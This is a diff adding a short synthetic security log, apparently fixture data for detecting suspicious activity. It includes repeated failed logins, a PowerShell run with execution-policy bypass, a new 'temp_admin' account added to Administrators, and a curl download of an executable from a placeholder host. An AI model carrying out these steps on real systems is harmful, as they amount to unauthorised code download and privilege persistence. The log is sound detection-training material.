@@ -1,0 +1,12 @@
+2026-04-20 08:12:44 AUTH Failed login for user jsmith from 192.168.1.15
+2026-04-20 08:13:02 AUTH Failed login for user jsmith from 192.168.1.15
+2026-04-20 08:13:31 AUTH Failed login for user jsmith from 192.168.1.15
+2026-04-20 08:14:10 AUTH Successful login for user admin from 192.168.1.25
+2026-04-20 09:02:18 PROC powershell.exe -ExecutionPolicy Bypass -File update.ps1
+2026-04-20 09:15:33 ACCT New user created: temp_admin by administrator
+2026-04-20 09:18:42 WEB curl http://example-download-site.local/toolkit.exe -o toolkit.exe
+2026-04-20 09:21:10 ACCT User temp_admin added to Administrators group
+2026-04-20 10:01:09 SYS Service started: Windows Update
+2026-04-20 10:22:47 AUTH Failed login for user mroberts from 10.0.0.44
+2026-04-20 10:23:01 AUTH Failed login for user mroberts from 10.0.0.44
+2026-04-20 11:45:55 WEB Normal web request completed with status 200
